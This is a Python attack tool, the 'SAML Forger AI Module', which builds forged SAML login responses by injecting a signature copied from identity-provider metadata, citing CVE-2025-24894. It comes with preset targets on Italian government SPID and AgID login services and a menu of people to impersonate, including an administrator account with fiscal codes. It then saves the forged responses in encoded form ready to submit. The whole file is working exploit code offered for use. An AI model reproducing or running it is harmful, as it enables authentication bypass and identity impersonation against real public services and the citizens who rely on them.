#!/usr/bin/env python3
"""
SAML Forger AI Module (CORRECTED)
Automated SAML response forgery with signature bypass (CVE-2025-24894)
"""

import os
import json
import base64
import random
import zlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from lxml import etree

import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich import print as rprint

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()


class SAMLForgerAI:
    def __init__(self):
        self.payload_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'data', 'payloads'
        )
        os.makedirs(self.payload_dir, exist_ok=True)
        self.idp_metadata = None
        self.forged_count = 0
        self.ns = {
            'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
            'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
            'ds': 'http://www.w3.org/2000/09/xmldsig#',
        }

    def run(self):
        console.print(Panel.fit("[bold magenta]SAML Forger AI v2.0 (CORRECTED)[/bold magenta]", border_style="magenta"))

        if not self._fetch_metadata():
            console.print("[red][!] Cannot proceed without metadata[/red]")
            return

        target = self._get_target()
        if not target:
            return

        user = self._get_user()
        count = int(Prompt.ask("[yellow]Number of responses to generate[/yellow]", default="3"))

        with console.status("[bold magenta]Forging SAML Responses...") as status:
            for i in range(count):
                self._forge_and_save(target, user, i)
                console.print(f"  [green]✓ Forged response #{i+1}[/green]")

        console.print(f"\n[green][✓] Generated {self.forged_count} forged SAML responses[/green]")
        console.print(f" [white]Saved to: {self.payload_dir}[/white]")

    def _fetch_metadata(self) -> bool:
        console.print("\n[cyan][*] Fetching IdP metadata...[/cyan]")
        urls = [
            'https://validator.spid.gov.it/metadata.xml',
            'https://demo.spid.gov.it/validator/metadata.xml',
        ]
        for url in urls:
            try:
                resp = requests.get(url, timeout=15, verify=False)
                if resp.status_code == 200 and 'Signature' in resp.text:
                    self.idp_metadata = resp.text
                    console.print(f" [green]✓ Metadata received: {url}[/green]")
                    return True
            except Exception as e:
                console.print(f" [yellow]! {url}: {str(e)[:40]}[/yellow]")
        return False

    def _get_target(self) -> Optional[Dict]:
        targets = [
            {'name': 'AgID Login Portal', 'url': 'https://login.agid.gov.it', 'acs': '/saml/acs',
             'issuer': 'https://validator.spid.gov.it/metadata.xml'},
            {'name': 'SPID Validator', 'url': 'https://validator.spid.gov.it', 'acs': '/samlsso',
             'issuer': 'https://validator.spid.gov.it/metadata.xml'},
            {'name': 'Custom Target', 'url': '', 'acs': '', 'issuer': ''},
        ]
        console.print("\n[cyan][*] Select target:[/cyan]")
        for i, t in enumerate(targets, 1):
            console.print(f"  {i}. {t['name']}")
        choice = Prompt.ask("[yellow]Choice[/yellow]", default="1")
        if choice == '3':
            url = Prompt.ask("[yellow]Target URL[/yellow]")
            acs = Prompt.ask("[yellow]ACS path[/yellow]", default="/saml/acs")
            return {'name': 'Custom', 'url': url, 'acs': acs, 'issuer': url}
        else:
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                return targets[idx]
        return targets[0]

    def _get_user(self) -> Dict:
        users = [
            {'name': 'MARCO', 'family': 'ROSSI', 'fiscal': 'RSSMRC85H15H501I', 'email': 'marco.rossi@pec.it',
             'birth': '1985-06-15', 'gender': 'M', 'place': 'ROMA', 'phone': '+393401234567'},
            {'name': 'LAURA', 'family': 'BIANCHI', 'fiscal': 'BNCLRA92M41F205Z', 'email': 'laura.bianchi@pec.it',
             'birth': '1992-08-01', 'gender': 'F', 'place': 'MILANO', 'phone': '+393356789012'},
            {'name': 'ADMIN', 'family': 'SYSTEM', 'fiscal': 'SYSTDMN00A00H501X', 'email': 'amministratore@agid.gov.it',
             'birth': '1980-01-01', 'gender': 'M', 'place': 'ROMA', 'phone': '+3906852641'},
        ]
        console.print("\n[cyan][*] Choose user to impersonate:[/cyan]")
        for i, u in enumerate(users, 1):
            console.print(f"  {i}. {u['name']} {u['family']} ({u['fiscal']})")
        console.print(f"  {len(users)+1}. Custom")
        choice = Prompt.ask("[yellow]Choice[/yellow]", default="1")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(users):
                return users[idx]
        except:
            pass
        return {
            'name': Prompt.ask("First name", default="MARCO"),
            'family': Prompt.ask("Last name", default="ROSSI"),
            'fiscal': Prompt.ask("Fiscal code", default="RSSMRC85H15H501I"),
            'email': Prompt.ask("Email", default="test@example.com"),
            'birth': Prompt.ask("Birth date", default="1985-06-15"),
        }

    def _forge_and_save(self, target: Dict, user: Dict, index: int):
        now = datetime.utcnow()
        response_id = f"_FRG_{random.randint(10**14, 10**15-1)}"
        assertion_id = f"_FRG_ASS_{random.randint(10**14, 10**15-1)}"
        issue_instant = now.strftime('%Y-%m-%dT%H:%M:%SZ')
        not_on_or_after = (now + timedelta(hours=8)).strftime('%Y-%m-%dT%H:%M:%SZ')
        acs_url = f"{target['url']}{target['acs']}"

        # FIXED: Extract signature element correctly (without getparent)
        sig_injection = ""
        if self.idp_metadata:
            try:
                root = etree.fromstring(self.idp_metadata.encode())
                sigs = root.findall('.//ds:Signature', self.ns)
                if sigs:
                    # FIXED: tostring(sigs[0]) NOT sigs[0].getparent()
                    sig_injection = etree.tostring(sigs[0], pretty_print=True).decode()
            except Exception:
                pass

        # Build SAML response with signature injection as first element (CVE-2025-24894)
        saml = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{response_id}" Version="2.0"
    IssueInstant="{issue_instant}" Destination="{acs_url}">

{sig_injection}

    <saml:Issuer>{target['issuer']}</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="{assertion_id}"
        IssueInstant="{issue_instant}" Version="2.0">
        <saml:Issuer>{target['issuer']}</saml:Issuer>
        <saml:Subject>
            <saml:NameID>{user['email']}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData
                    NotOnOrAfter="{not_on_or_after}"
                    Recipient="{acs_url}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{issue_instant}" NotOnOrAfter="{not_on_or_after}">
            <saml:AudienceRestriction>
                <saml:Audience>{target['url']}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{issue_instant}">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['name']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="familyName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['family']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="fiscalNumber" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['fiscal']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['email']}</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>'''

        # FIXED: Consistent DEFLATE implementation
        def _deflate(data: bytes) -> bytes:
            compress = zlib.compressobj(level=9, wbits=-zlib.MAX_WBITS)
            deflated = compress.compress(data)
            deflated += compress.flush()
            return deflated

        timestamp = datetime.now().strftime('%H%M%S')
        xml_file = os.path.join(self.payload_dir, f'saml_forged_{timestamp}_{index}.xml')
        with open(xml_file, 'w') as f:
            f.write(saml)

        b64_file = os.path.join(self.payload_dir, f'saml_forged_{timestamp}_{index}.b64')
        with open(b64_file, 'w') as f:
            f.write(base64.b64encode(saml.encode()).decode())

        # FIXED: Use consistent deflate
        compressed = _deflate(saml.encode())
        def_file = os.path.join(self.payload_dir, f'saml_forged_{timestamp}_{index}.deflated.b64')
        with open(def_file, 'w') as f:
            f.write(base64.b64encode(compressed).decode())

        self.forged_count += 1


def run():
    forger = SAMLForgerAI()
    forger.run()


if __name__ == "__main__":
    run()
